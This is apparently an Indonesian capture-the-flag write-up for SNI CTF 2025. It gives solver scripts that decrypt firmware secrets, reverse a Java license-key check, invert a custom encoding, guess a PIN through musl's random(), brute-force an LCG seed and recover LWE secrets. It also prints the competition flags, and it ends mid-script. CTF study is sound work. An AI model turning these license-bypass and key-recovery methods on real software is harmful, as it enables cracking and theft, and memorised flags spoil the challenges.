---
title: SNI CTF 2025

---

# SNI CTF 2025

###### tags: `Tag(CTF!)`

## Forensics
### Explore

Diberikan sebuah file chall.bin dengan tipe data tanpa ekstensi yang jelas.
Pada tahap awal, file ini terlihat seperti binary acak dan tidak bisa dibuka secara langsung.
Setelah dilakukan pengecekan lebih lanjut menggunakan binwalk, ditemukan bahwa pada offset tertentu terdapat filesystem SquashFS.
Hal ini menunjukkan bahwa file tersebut sebenarnya adalah firmware image yang memiliki header palsu di awal file.
Filesystem kemudian diekstrak menggunakan binwalk -e.
Eksplorasi Filesystem
Di dalam filesystem ditemukan beberapa file penting:
![image](https://hackmd.io/_uploads/H1T7RGdQ-e.png)

Keberadaan source code (.c) menunjukkan bahwa challenge ini mengarah ke analisis logika sistem, bukan brute force.
Analisis Key Derivation
File derive_key.c digunakan untuk membuat key dengan cara:
- Membaca nilai dari machine-id
- Menggabungkannya dengan string WARMBOOT-SALT
- Melakukan hash menggunakan SHA256
- Mengambil 16 byte pertama sebagai key


Key ini bersifat deterministik dan selalu sama selama machine-id tidak berubah.
Analisis File Terenkripsi
File secret.cfg.enc berisi data terenkripsi dengan panjang 37 byte.
Ukuran ini tidak sesuai dengan block cipher biasa, sehingga mengarah ke stream cipher.
Setelah dilakukan analisis, diketahui bahwa file ini dienkripsi menggunakan AES-128 CTR, dengan:
Key dari hasil derive_key
IV bernilai nol


Dekripsi dan Flag
karena kita sudah mendapatkan info yang diperlukan baru bisa bikin solver nya

s.py
```python!
from Crypto.Cipher import AES
import hashlib


machine_id = "02:ab:cd:12:34:56"


key = hashlib.sha256(
    b"WARMBOOT-SALT" + machine_id.encode()
).digest()[:16]


ciphertext = bytes.fromhex(
    "ab002fdbaf9b5a9ecde5868664bb37ae"
    "63033a0fe3a03330e153fdce30ad7f53"
    "7e05870fd0"
)


iv = b"\x00" * 16
cipher = AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv)


plaintext = cipher.decrypt(ciphertext)
print(plaintext)
```

Result:
![image](https://hackmd.io/_uploads/rJ-_CMO7We.png)

Format flag mengikuti format kompetisi, sehingga flag akhirnya adalah:
#### FLAG: SNI{ayo_belajar_firmware_00eefdbc83aca3}


## Reverse Engineering
### Jajajaja
Diberikan sebuah challenge reverse engineering berupa file Jajajaja.exe.
Sekilas file terlihat seperti binary Windows biasa, namun setelah dicek menggunakan file, ternyata executable tersebut adalah Zip archive dengan data tambahan di awal, yang mengindikasikan penggunaan Launch4j sebagai Java launcher.
Setelah executable di-rename menjadi .zip dan di-extract, ditemukan beberapa file .class Java, di antaranya:
![image](https://hackmd.io/_uploads/ByGZkm_mbe.png)

Dari sini dapat disimpulkan bahwa challenge ini bukan native binary, melainkan Java application yang dibungkus ke dalam EXE.
Analisis Awal

saya decompile menggunakan tools online
https://www.decompiler.com/





Jajajaja.java
```java
   package com.flab.jajajaja;


import com.flab.jajajaja.Jajajaja.1;
import java.awt.EventQueue;


public class Jajajaja {
   public static void main(String[] args) {
      EventQueue.invokeLater(new 1());
   }
}


ChaCha.java
 package com.flab.jajajaja;


import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.ChaCha20ParameterSpec;
import javax.crypto.spec.SecretKeySpec;


public class ChaCha20 {
   private static final String ENV_KEY_NAME = "MAKEY";


   public static String decrypt(String ciphertextBase64, String nonceBase64, int counter) throws Exception {
      String keyStr = System.getenv("MAKEY");
      if (keyStr != null && !keyStr.isEmpty()) {
         byte[] keyBytes = Base64.getDecoder().decode(keyStr);
         byte[] nonceBytes = Base64.getDecoder().decode(nonceBase64);
         byte[] ciphertextBytes = Base64.getDecoder().decode(ciphertextBase64);
         Cipher cipher = Cipher.getInstance("ChaCha20");
         ChaCha20ParameterSpec paramSpec = new ChaCha20ParameterSpec(nonceBytes, counter);
         SecretKeySpec keySpec = new SecretKeySpec(keyBytes, "ChaCha20");
         cipher.init(2, keySpec, paramSpec);
         byte[] decryptedBytes = cipher.doFinal(ciphertextBytes);
         return new String(decryptedBytes);
      } else {
         throw new RuntimeException("Environment variable MAKEY is not set.");
      }
   }
}
```

CodeUI.java
```java
 package com.flab.jajajaja;


import com.flab.jajajaja.CodeUI.1;
import java.awt.Color;
import java.awt.Cursor;
import java.awt.Font;
import java.awt.LayoutManager;
import java.awt.event.ActionEvent;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import javax.swing.border.LineBorder;


public class CodeUI extends JPanel {
   private JButton activateButton;
   private JLabel instructionLabel;
   private JTextField keyField;
   private JLabel statusLabel;
   private JLabel titleLabel;


   public CodeUI() {
      this.initComponents();
      this.setBackground(new Color(30, 30, 30));
   }


   private void initComponents() {
      this.titleLabel = new JLabel();
      this.instructionLabel = new JLabel();
      this.keyField = new JTextField();
      this.activateButton = new JButton();
      this.statusLabel = new JLabel();
      this.setLayout((LayoutManager)null);
      this.titleLabel.setFont(new Font("Segoe UI", 1, 24));
      this.titleLabel.setForeground(new Color(255, 255, 255));
      this.titleLabel.setHorizontalAlignment(0);
      this.titleLabel.setText("SOFTWARE ACTIVATION");
      this.add(this.titleLabel);
      this.titleLabel.setBounds(0, 50, 600, 32);
      this.instructionLabel.setFont(new Font("Segoe UI", 0, 14));
      this.instructionLabel.setForeground(new Color(204, 204, 204));
      this.instructionLabel.setText("Enter your license key below:");
      this.add(this.instructionLabel);
      this.instructionLabel.setBounds(100, 120, 178, 20);
      this.keyField.setBackground(new Color(51, 51, 51));
      this.keyField.setFont(new Font("Monospaced", 0, 14));
      this.keyField.setForeground(new Color(255, 255, 255));
      this.keyField.setHorizontalAlignment(0);
      this.keyField.setBorder(new LineBorder(new Color(102, 102, 102), 1, true));
      this.add(this.keyField);
      this.keyField.setBounds(100, 150, 400, 40);
      this.activateButton.setBackground(new Color(0, 0, 204));
      this.activateButton.setFont(new Font("Segoe UI", 1, 14));
      this.activateButton.setForeground(new Color(255, 255, 255));
      this.activateButton.setText("ACTIVATE NOW");
      this.activateButton.setBorderPainted(false);
      this.activateButton.setCursor(new Cursor(12));
      this.activateButton.setFocusPainted(false);
      this.activateButton.addActionListener(new 1(this));
      this.add(this.activateButton);
      this.activateButton.setBounds(200, 220, 200, 40);
      this.statusLabel.setFont(new Font("Segoe UI", 0, 12));
      this.statusLabel.setForeground(new Color(255, 51, 51));
      this.statusLabel.setHorizontalAlignment(0);
      this.add(this.statusLabel);
      this.statusLabel.setBounds(0, 280, 600, 30);
   }


   private void activateButtonActionPerformed(ActionEvent evt) {
      String inputKey = this.keyField.getText().trim();
      if (KeyValidator.validate(inputKey)) {
         JFrame topFrame = (JFrame)SwingUtilities.getWindowAncestor(this);
         topFrame.getContentPane().removeAll();
         topFrame.add(new Flag());
         topFrame.revalidate();
         topFrame.repaint();
      } else {
         this.statusLabel.setText("Invalid License Key. Please try again.");
         this.keyField.setBorder(new LineBorder(new Color(255, 51, 51), 1, true));
      }


   }
}
```
Flag.java
```java
package com.flab.jajajaja;


import java.awt.Color;
import java.awt.Font;
import java.awt.LayoutManager;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.border.LineBorder;


public class Flag extends JPanel {
   private JTextField flagField;
   private JLabel successLabel;


   public Flag() {
      this.initComponents();
      this.setBackground(new Color(30, 30, 30));
   }


   private void initComponents() {
      this.successLabel = new JLabel();
      this.flagField = new JTextField();
      this.setLayout((LayoutManager)null);
      this.successLabel.setFont(new Font("Segoe UI", 1, 36));
      this.successLabel.setForeground(new Color(51, 255, 51));
      this.successLabel.setHorizontalAlignment(0);
      this.successLabel.setText("SUCCESS!");
      this.add(this.successLabel);
      this.successLabel.setBounds(0, 80, 600, 48);
      this.flagField.setEditable(false);
      this.flagField.setBackground(new Color(51, 51, 51));
      this.flagField.setFont(new Font("Monospaced", 1, 18));
      this.flagField.setForeground(new Color(255, 255, 255));
      this.flagField.setHorizontalAlignment(0);


      try {
         this.flagField.setText(ChaCha20.decrypt("4cyqC2Y5nLRYn/XbyB4xg25Ie0oi3Y+4LR1YWDA=", "oqKbQ+ltdeq80Mxk", 1337));
      } catch (Exception var2) {
         this.flagField.setText("Failed to decrypt flag: " + var2.getMessage());
      }


      this.flagField.setBorder(new LineBorder(new Color(51, 255, 51), 1, true));
      this.add(this.flagField);
      this.flagField.setBounds(100, 180, 400, 50);
   }
}


KeyValidator.java
package com.flab.jajajaja;


public class KeyValidator {
   public static boolean validate(String key) {
      if (key != null && key.length() == 35) {
         String[] segments = key.split("-");
         if (segments.length != 4) {
            return false;
         } else {
            try {
               long s1 = Long.parseLong(segments[0], 16);
               long s2 = Long.parseLong(segments[1], 16);
               long s3 = Long.parseLong(segments[2], 16);
               long s4 = Long.parseLong(segments[3], 16);
               if ((s1 ^ s2) != 991153055L) {
                  return false;
               } else if ((s2 + s3 & 4294967295L) != 3548082989L) {
                  return false;
               } else if ((s1 * 4919L & 4294967295L) != 2871439159L) {
                  return false;
               } else if ((s3 & s4) != 3195405L) {
                  return false;
               } else if ((s3 ^ s4) != 2882216434L) {
                  return false;
               } else {
                  long rotated = (s2 << 13 | s2 >>> 19) & 4294967295L;
                  if ((rotated ^ 3735928559L) != 794719367L) {
                     return false;
                  } else if ((s1 + s2 + s3 + s4 & 65535L) != 31147L) {
                     return false;
                  } else if (Long.bitCount(s1 ^ s4) != 15) {
                     return false;
                  } else {
                     long highSum = (s1 >>> 16) + (s2 >>> 16) + (s3 >>> 16) + (s4 >>> 16);
                     return (highSum & 65535L) == 26566L;
                  }
               }
            } catch (NumberFormatException var14) {
               return false;
            }
         }
      } else {
         return false;
      }
   }
}
```

Entry point program berada pada class:
`Jajajaja.java`
Program menampilkan sebuah GUI dan meminta user memasukkan sebuah key.
Key tersebut kemudian diverifikasi menggunakan class KeyValidator.
Jika key valid, maka panel flag akan ditampilkan.
Analisis KeyValidator
Dari hasil decompile KeyValidator.class, diketahui bahwa key harus memiliki format:
`<hex>-<hex>-<hex>-<hex>`

Dengan panjang total 35 karakter, dan setiap segmen diparse sebagai hexadecimal 32-bit integer.
Key akan divalidasi menggunakan serangkaian operasi bitwise dan aritmatika, antara lain:
* XOR
* AND
* Penjumlahan modulo 2³²
* Perkalian modulo 2³²
* Rotate left / rotate right
* Bit count
* Penjumlahan high 16-bit


Contoh constraint yang digunakan:
* s1 ^ s2 == 991153055
* (s2 + s3) & 0xffffffff == 3548082989
* (s1 * 4919) & 0xffffffff == 2871439159
* (s3 & s4) == 3195405
* bitcount(s1 ^ s4) == 15


Karena semua operasi bersifat deterministik, maka key tidak perlu brute force, melainkan bisa diselesaikan dengan solver matematis.
s.py
```python!
from base64 import b64decode
from Crypto.Cipher import ChaCha20


key = b64decode("IKMitMLmeZ3uVceCf5s4gyqsFrNls54ml9e9IRWpd9k=")
nonce = b64decode("oqKbQ+ltdeq80Mxk")
ciphertext = b64decode("4cyqC2Y5nLRYn/XbyB4xg25Ie0oi3Y+4LR1YWDA=")


cipher = ChaCha20.new(key=key, nonce=nonce, initial_value=1337)
print(cipher.decrypt(ciphertext).decode())
```

Dengan menurunkan satu per satu constraint tersebut, diperoleh nilai:
![image](https://hackmd.io/_uploads/SkfpxXOXbx.png)

* s1 = 0x68544401
* s2 = 0x53478f9e
* s3 = 0x8033e38f
* s4 = 0x2bf8c27d

Sehingga key valid adalah:
`68544401-53478f9e-8033e38f-2bf8c27d`

Menariknya, key input user tidak digunakan untuk decrypt flag.
Pada class Flag, flag didecrypt menggunakan fungsi:
```java
ChaCha20.decrypt(ciphertext, nonce, 1337)
```

Sedangkan pada `ChaCha20.class`, key diambil dari environment variable:
```Java
System.getenv("MAKEY")
```

Dari hasil strings pada executable, ditemukan nilai:
`MAKEY=IKMitMLmeZ3uVceCf5s4gyqsFrNls54ml9e9IRWpd9k=`
Key tersebut merupakan Base64 encoded 32-byte key, sesuai dengan spesifikasi `ChaCha20.`

Artinya:
* Key input hanya berfungsi sebagai gate UI
* Crypto key sebenarnya hardcoded sebagai environment variable

Decrypt Flag
Dengan parameter:
Key: IKMitMLmeZ3uVceCf5s4gyqsFrNls54ml9e9IRWpd9k=
Nonce: oqKbQ+ltdeq80Mxk
Counter: 1337
Ciphertext: 4cyqC2Y5nLRYn/XbyB4xg25Ie0oi3Y+4LR1YWDA=
lalu
![image](https://hackmd.io/_uploads/rkJAb7dm-l.png)

masukkan key:
`68544401-53478f9e-8033e38f-2bf8c27d`

Result:
![image](https://hackmd.io/_uploads/r1e7Mmdm-x.png)

#### FLAG: SNI{r3v_J4v4_L4unch4r_9f2b1e}

### AgainN2
Diberikan sebuah challenge ELF 64-bit dengan proteksi standar (PIE, stripped). Program ini menerima input string dan mengeluarkan hasil encoded message. Sekilas, dari tampilan output dan karakter yang digunakan, encoding ini terlihat seperti Base64, namun setelah dianalisis lebih lanjut ternyata bukan Base64 standar.
Analisis Awal
Dari hasil strings, ditemukan sebuah tabel karakter sepanjang 64 byte:
![image](https://hackmd.io/_uploads/BJsrXQdXZg.png)

`Z1aB2bC3cD4dE5eF6fG7gH8hI9iJ0jKkLlMmNnOoPpQqRrSsTtUuVvWwXxYy+/`


Hal ini mengarahkan asumsi awal bahwa program menggunakan mekanisme mirip Base64. Namun, asumsi ini ternyata menyesatkan.
Program utama:
* Menerima input menggunakan fgets
* Menghapus newline
* Memproses setiap karakter input
* Menghasilkan string output berdasarkan tabel karakter di atas

Analisis Fungsi Kritis
Fungsi Transformasi Byte
Dari hasil decompile (saya menggunakan tools online yaitu https://dogbolt.org), ditemukan fungsi berikut:
```clike
byte transform(byte x) {
    if ( ((x >> 1) & 1) != ((x >> 5) & 1) )
        return x ^ 0x22;
    return x;
}
```
Artinya:
* Program membandingkan bit ke-1 dan bit ke-5
* Jika berbeda → byte di-XOR dengan 0x22
* Jika sama → byte dibiarkan

Ini adalah conditional XOR berbasis bit, bukan operasi acak.

Fungsi Encoding
Fungsi utama encoding bekerja sebagai berikut:
`out[i] = table[ transform(input[i]) % 0x3e ];`


Poin penting:
* % 0x3e berarti modulo 62
* Walaupun tabel berisi 64 karakter, dua karakter terakhir (+ dan /) tidak pernah digunakan
* Ini bukan Base64, melainkan custom substitution cipher modulo 62


Pipeline encoding:
input_char
 → conditional XOR (0x22)
 → modulo 62
 → lookup table
 → output_char

File r
File r berisi string hasil encoding:
![image](https://hackmd.io/_uploads/HJTQVQuQWe.png)

`uSd/VDXDVvD1DTp5TDDV5Tp1n9vItfW81Xf1N5Ivxbgl`

Tujuan challenge adalah membalik proses encoding ini untuk mendapatkan plaintext flag.

Strategi Reverse (Decoding)
Untuk setiap karakter ciphertext:
1. Cari indeks karakter tersebut di tabel
1. Cari semua byte x (0–255) yang memenuhi:
transform(x) % 62 == index
1. Filter hasil ke karakter ASCII printable
1. Karena % 62, beberapa posisi menghasilkan lebih dari satu kandidat
1. Ambiguitas diselesaikan menggunakan format flag CTF dan konteks soal


Hasil Kandidat Ambigu
Contoh hasil kandidat per posisi:
['3', 'S']
[')', 'I']
['6', 'V']
['4', 'T']

Dengan mempertimbangkan:
* Format flag event: SNI{...}
* Konsistensi kata
* Tema soal (custom base64, bit manipulation)

karena semua info yang diperlukan sudah ada jadi kita bisa membuat solvernya, ini solver yang saya pakai:
solver.py
```python!
table = "Z1aB2bC3cD4dE5eF6fG7gH8hI9iJ0jKkLlMmNnOoPpQqRrSsTtUuVvWwXxYy+/"
cipher = "uSd/VDXDVvD1DTp5TDDV5Tp1n9vItfW81Xf1N5Ivxbgl"


def transform(x):
    b1 = (x >> 1) & 1
    b5 = (x >> 5) & 1
    if b1 != b5:
        return x ^ 0x22
    return x


ALLOWED = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_()-"


for c in cipher:
    idx = table.index(c)
    candidates = []
    for x in range(256):
        if transform(x) % 62 == idx:
            if chr(x) in ALLOWED:
                candidates.append(chr(x))
    print(candidates)
```

Result:
![image](https://hackmd.io/_uploads/ByzlHmu7Wx.png)
#### FLAG: SNI{reverse_engineering_custom64_vm_bitswap}


### ohpinst (upsolve)

Analisis Awal (ELF – musl)
Binary menggunakan musl libc, bukan glibc → random() punya perilaku berbeda.
Program membuat PIN acak panjang 6–8 digit dan memberi 19 kali percobaan.
Dari analisis fungsi random() musl, ditemukan pola deterministik:
* Jika dua digit awal sama (aa)
* Maka dua digit terakhir juga sama (bb)
* Contoh pola: aa-?-?-bb


Eksploitasi:
* Tebak dua digit awal sama → 2
* Lanjut brute sisa digit
* Setelah didapat digit ke-5 = 4, maka digit ke-6 juga 4
* PIN valid: 228544


Jika panjang PIN 7 atau 8 digit → tidak solvable
Challenge hanya feasible saat panjang = 6
Decompile Python (PyInstaller)
Setelah lolos tahap awal, ditemukan binary Python hasil PyInstaller (Python 3.12).
File penting hasil extract:

main.py

```python
#Decompiled with PyLingual (https://pylingual.io)
#Internal filename: main.py
#Bytecode version: 3.12.0rc2 (3531)
#source timestamp: 1970-01-01 00:00:00 UTC (0)

from manager import Manager
import sys


def clean_excepthook(exc_type, exc_value, exc_traceback):
    print('Error: Something went wrong, please try again.')
sys.excepthook = clean_excepthook


def main():
    maze_width = 70
    maze_height = 70
    required_moves = 908
    try:
        game_manager = Manager(maze_width, maze_height, moves=required_moves)
    except ValueError as e:
        pass  # postinserted
    else:  # inserted
        print('\nWelcome to the Maze Challenge! Navigate to \'E\'.')
        print('Use \'w\' (up), \'a\' (left), \'s\' (down), \'d\' (right) to move. Type \'q\' to quit.')
        pass
        if game_manager.check_win():
            return
        move_input = input('Enter your move (w/a/s/d) or \'q\' to quit: ').strip().lower()
        if move_input == 'q':
            print('Exiting game. Goodbye!')
            return
        if move_input in ['w', 'a', 's', 'd']:
            game_manager.move(move_input)
        else:  # inserted
            print('Invalid input. Please use \'w\', \'a\', \'s\', \'d\' for movement or \'q\' to quit.')
        print('\nSomething went wrong, please try again.')
        return
    else:  # inserted
        pass


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass  # postinserted
    print('An unexpected error occurred. Please try again.')
```


manager.py
```python
#Decompiled with PyLingual (https://pylingual.io)
#Internal filename: manager.py
#Bytecode version: 3.12.0rc2 (3531)
#Source timestamp: 1970-01-01 00:00:00 UTC (0)=

from tile import Tile, TileValue
from render import Render
from os import _exit


class Manager:


    def __init__(self, x, y, moves):
        self._tile = Tile(x, y)
        self._tile.init_zeros()
        if not self._tile.generate(target_path_length=moves):
            raise ValueError('Could not generate a maze')
        self._render = Render(self._tile)
        self._player_pos = self._tile.start
        self._move_count = 0
        self.render_game()


    def get_flag(self):
        c = bytearray(bytes.fromhex('4bb6b048334940fa92f7fef985b9aa93eb1c70b44ed1bfec2045bb545b46a9b76eb6902d41b6b9334548773ef2a654c371ff9694e8e9fa'))
        print('Waiting...')
        for i in range(len(c)):
            c[i] ^= (lambda n: [(s := [self._move_count]), [s.append((s[-1] * 7438 + 9332) % 14837) for _ in range(n)]][0][-1])(i + 10000000)
        print(f"Flag: {c.decode('latin-1')}")


    def render_game(self):
        self._render.render(self._player_pos)
        print(f'Moves: {self._move_count}')


    def move(self, direction):
        current_r, current_c = self._player_pos
        next_r, next_c = (current_r, current_c)
        if direction == 'w':
            next_r -= 1
        elif direction == 's':
            next_r += 1
        elif direction == 'a':
            next_c -= 1
        elif direction == 'd':
            next_c += 1
        else:
            print('Invalid move. Use w, a, s, d.')
            _exit(-1)
        if 0 <= next_r < self._tile.y and 0 <= next_c < self._tile.x and (self._tile[next_r, next_c] != TileValue.WALL):
            self._player_pos = (next_r, next_c)
            self._move_count += 1
            self.render_game()
            return True
        print('Cannot move there!')
        _exit(-1)


    def check_win(self):
        if self._player_pos == self._tile.end:
            print('\n*** You reached the end! ***')
            self.get_flag()
            return True
        return False
```


render.py
```python
#Decompiled with PyLingual (https://pylingual.io)
#Internal filename: render.py
#Bytecode version: 3.12.0rc2 (3531)
#Source timestamp: 1970-01-01 00:00:00 UTC (0)

from tile import TileValue


class Render:


    def __init__(self, tile):
        self._tile = tile


    def render(self, player_pos):
        print('-' * (self._tile.x * 2 + 1))
        for r in range(self._tile.y):
            row_str = '|'
            for c in range(self._tile.x):
                if (r, c) == player_pos:
                    row_str += ' ?'
                else:
                    tile_val = self._tile[r, c]
                    if tile_val == TileValue.WALL:
                        row_str += ' ?'
                    elif tile_val == TileValue.PATH:
                        row_str += ' ?'
                    elif tile_val == TileValue.START:
                        row_str += ' S'
                    elif tile_val == TileValue.END:
                        row_str += ' E'
                    else:
                        row_str += ' ?'
            row_str += ' |'
            print(row_str)
        print('-' * (self._tile.x * 2 + 1))
```


tile.py
```python
#Decompiled with PyLingual (https://pylingual.io)
#Internal filename: tile.py
#Bytecode version: 3.12.0rc2 (3531)
#Source timestamp: 1970-01-01 00:00:00 UTC (0)

from enum import Enum
import random
import collections


class TileValue(Enum):
    WALL = 0
    PATH = 1
    START = 2
    END = 3


class Tile:


    def __init__(self, x, y):
        self.x = max(3, x if x % 2 != 0 else x - 1)
        self.y = max(3, y if y % 2 != 0 else y - 1)
        self._start = (1, 1)
        self._end = (self.y - 2, self.x - 2)
        self._value = []


    def init_zeros(self):
        self._value = [[TileValue.WALL for _ in range(self.x)] for _ in range(self.y)]


    def __setitem__(self, key, value):
        self._value[key[0]][key[1]] = value


    def __getitem__(self, key):
        return self._value[key[0]][key[1]]


    def generate(self, target_path_length=None, max_attempts=10000):
        if target_path_length is None:
            self._generate_random_maze()
            return True
        for attempt in range(max_attempts):
            self._generate_random_maze()
            actual_length = self.find_shortest_path(self._start, self._end)
            if actual_length == target_path_length:
                return True
        else:
            return False


    def _generate_random_maze(self):
        self.init_zeros()
        stack = [self._start]
        self._value[self._start[0]][self._start[1]] = TileValue.START
        visited = set()
        visited.add(self._start)
        while stack:
            current_r, current_c = stack[-1]
            neighbors = []
            for dr, dc in [(0, 2), (0, -2), (2, 0), (-2, 0)]:
                nr, nc = (current_r + dr, current_c + dc)
                if 0 < nr < self.y - 1 and 0 < nc < self.x - 1:
                    if (nr, nc) not in visited:
                        neighbors.append(((nr, nc), (current_r + dr // 2, current_c + dc // 2)))
            if neighbors:
                (next_r, next_c), (wall_r, wall_c) = random.choice(neighbors)
                self._value[wall_r][wall_c] = TileValue.PATH
                self._value[next_r][next_c] = TileValue.PATH
                visited.add((next_r, next_c))
                stack.append((next_r, next_c))
            else:
                stack.pop()
        self._value[self._start[0]][self._start[1]] = TileValue.START
        self._value[self._end[0]][self._end[1]] = TileValue.END


    def find_shortest_path(self, start_pos, end_pos):
        queue = collections.deque([(start_pos, 0)])
        visited = {start_pos}
        while queue:
            (r, c), dist = queue.popleft()
            if (r, c) == end_pos:
                return dist
            for dr, dc in [(0, 1), (0, -1), (1, 0), (-1, 0)]:
                nr, nc = (r + dr, c + dc)
                if 0 <= nr < self.y and 0 <= nc < self.x:
                    if self._value[nr][nc] != TileValue.WALL:
                        if (nr, nc) not in visited:
                            visited.add((nr, nc))
                            queue.append(((nr, nc), dist + 1))
        return -1


    @property
    def start(self):
        return self._start


    @property
    def end(self):
        return self._end


    @property
    def grid(self):
        return self._value
```


Maze hanya decoy.
Logic Flag (Manager)
Setelah decompile manager.py, flag dienkripsi sebagai berikut:
Ciphertext hardcoded (hex)
XOR dengan output LCG


Parameter:

a = 7438
b = 9332
m = 14837
seed = move_count

Setiap byte:
* LCG di-jump 10.000.000 + i langkah
* Ambil & 0xff


Tidak ada validasi bahwa move_count harus 908 → seed bisa di-brute-force.

Solusi:
-->Modulus kecil (14837)
-->Brute-force semua seed
-->Filter output printable (SNI{...})


Seed valid:
`12201`

Karena info yang diperlukan sudah ada jadi kita tinggal bikin solver, ini solver yang saya pakai:


solver.py
```python
import string


def solve_smart():
    # Ciphertext
    hex_str = '4bb6b048334940fa92f7fef985b9aa93eb1c70b44ed1bfec2045bb545b46a9b76eb6902d41b6b9334548773ef2a654c371ff9694e8e9fa'
    ciphertext = bytearray(bytes.fromhex(hex_str))
   
    # Parameter LCG
    A_orig = 7438
    B_orig = 9332
    M = 14837
    JUMP_STEPS = 10000000 # i + 10jt


    print("[*] Menghitung parameter lompatan LCG (Modular Exponentiation)...")
   
    # Kita ingin mencari fungsi F(x) yang setara dengan menjalankan LCG 10.000.000 kali.
    # LCG: next = (A * prev + B) % M
    # Komposisi fungsi linear bisa dihitung cepat.
   
    def get_jump_params(a, b, m, n):
        # Base transformation: x -> a*x + b
        mul = 1
        inc = 0
       
        cur_mul = a
        cur_inc = b
       
        while n > 0:
            if n % 2 == 1:
                # Apply current transform to result
                # Res_new(x) = cur(res(x)) = cur_mul * (mul*x + inc) + cur_inc
                mul = (cur_mul * mul) % m
                inc = (cur_mul * inc + cur_inc) % m
           
            # Square the current transform
            # Cur_new(x) = cur(cur(x)) = cur_mul * (cur_mul*x + cur_inc) + cur_inc
            new_inc = (cur_mul * cur_inc + cur_inc) % m
            cur_mul = (cur_mul * cur_mul) % m
            cur_inc = new_inc
           
            n //= 2
        return mul, inc


    # Parameter untuk melompat 10.000.000 langkah sekaligus
    jump_mul, jump_inc = get_jump_params(A_orig, B_orig, M, JUMP_STEPS)
   
    print("[*] Melakukan Brute Force Cerdas (0 - 14837)...")
   
    # Karakter yang dianggap "Valid" untuk flag
    valid_chars = string.ascii_letters + string.digits + "{}_-!@? "
   
    found = False
    for seed in range(M): # Cek semua kemungkinan seed (move_count)
       
        # Hitung state awal setelah 10jt langkah secara instan
        # state_i0 = (seed * jump_mul + jump_inc) % M
        current_state = (seed * jump_mul + jump_inc) % M
       
        # Decrypt
        decrypted = []
        is_readable = True
       
        # Kita pakai state temp agar tidak merusak loop utama
        temp_state = current_state
       
        # Cek 10 karakter pertama dulu biar cepat
        for i in range(len(ciphertext)):
            char_code = ciphertext[i] ^ (temp_state & 0xFF)
           
            # Heuristik: Jika karakter aneh, skip seed ini
            if chr(char_code) not in valid_chars:
                is_readable = False
                break
           
            decrypted.append(chr(char_code))
           
            # Update state untuk karakter berikutnya (1 langkah biasa)
            temp_state = (temp_state * A_orig + B_orig) % M
       
        if is_readable:
            flag_candidate = "".join(decrypted)
            print(f"\n[+] KANDIDAT DITEMUKAN! (Seed/MoveCount: {seed})")
            print(f"[+] FLAG: {flag_candidate}")
            found = True


    if not found:
        print("\n[-] Tidak ditemukan kandidat yang readable. Coba cek hex string lagi.")


if __name__ == "__main__":
    solve_smart()
```

Result:
![image](https://hackmd.io/_uploads/SyyVKmu7-x.png)
#### Flag: SNI{N1c3_0ne_Y0u_S0lV3d_Th3_M4zeD_Th3_Fl4g_1s_Th3_Fl4g}


## Cryptography
### Cihuy
Diberikan file chall.py yang mengimplementasi LWE (Learning With Errors) problem untuk encrypt flag. File out.txt berisi ciphertext dan 1000 sample data.

Code Analysis

chall.py
```python
#!/usr/bin/env python3
from secrets import randbelow
import hashlib
import ecdsa


flag = open("flag.txt", "rb").read().strip()


curve = ecdsa.curves.NIST521p
p = curve.order


alpha = randbelow(p - 1) + 1
beta  = randbelow(p - 1) + 1
         
B = 2**16          


T1_list = []
T2_list = []
A1_list = []
A2_list = []


for _ in range(1000):
    t1 = randbelow(p - 1) + 1
    t2 = randbelow(p - 1) + 1
    e1 = randbelow(2 * B) - B
    e2 = randbelow(2 * B) - B
    a1 = (t1 * alpha - e1) % p
    a2 = (t2 * beta  - e2) % p
    T1_list.append(t1)
    T2_list.append(t2)
    A1_list.append(a1)
    A2_list.append(a2)


seed = f"{alpha}|{beta}".encode()
mask = hashlib.sha256(seed).digest()
out = mask
while len(out) < len(flag):
    out = hashlib.sha256(out).digest()
    mask += out
ks = mask[:len(flag)]


ct = bytes(f ^ k for f, k in zip(flag, ks))
ct = int.from_bytes(ct, "big")


print(ct)
for t1, t2, a1, a2 in zip(T1_list, T2_list, A1_list, A2_list):
    print(t1, t2, a1, a2)
```





Key points dari chall.py:
```python
python
p = ecdsa.curves.NIST521p.order  # Modulus besar (~10^156)
B = 2**16  # Error bound = 65536
alpha, beta = secret random values
# Generate 1000 samples:
a1 = (t1 * alpha - e1) % p  # e1 in range [-B, B]
a2 = (t2 * beta  - e2) % p  # e2 in range [-B, B]
# Flag encryption:
seed = f"{alpha}|{beta}".encode()
mask = SHA256(seed)
flag_encrypted = flag XOR mask
```
Goal: Recovery alpha dan beta untuk decrypt flag.

Vulnerability

Error e1, e2 terlalu kecil dibanding modulus p:
- Error max: ±65536
- Modulus: ~6.9 × 10^156

Ini memungkinkan **brute force error** karena:
a1 = t1 * alpha - e1  =>  alpha = (a1 + e1) / t1 mod p
Dengan mencoba semua kemungkinan e1 dari -65536 hingga 65536, kita bisa recover alpha yang valid.

Exploit

solver.py
```python
#!/usr/bin/env python3
import hashlib
import ecdsa


curve = ecdsa.curves.NIST521p
p = curve.order
B = 2**16


# Load data
with open('out.txt', 'r') as f:
    lines = f.read().strip().split('\n')


ct = int(lines[0])
samples = []
for line in lines[1:]:
    t1, t2, a1, a2 = map(int, line.split())
    samples.append((t1, t2, a1, a2))


print(f"[+] Loaded {len(samples)} samples")


# Brute force e1 untuk recover alpha
t1, t2, a1, a2 = samples[0]


for e1 in range(-B, B+1):
    alpha = ((a1 + e1) * pow(t1, -1, p)) % p
   
    # Verify dengan sample lain
    valid = True
    for i in range(1, 5):
        t1_i, _, a1_i, _ = samples[i]
        e1_check = (t1_i * alpha - a1_i) % p
        if e1_check > p // 2:
            e1_check -= p
       
        if abs(e1_check) > B:
            valid = False
            break
   
    if valid:
        print(f"[+] Found alpha (e1={e1})")
       
        # Brute force e2 untuk recover beta
        for e2 in range(-B, B+1):
            beta = ((a2 + e2) * pow(t2, -1, p)) % p
           
            valid_beta = True
            for i in range(1, 5):
                _, t2_i, _, a2_i = samples[i]
                e2_check = (t2_i * beta - a2_i) % p
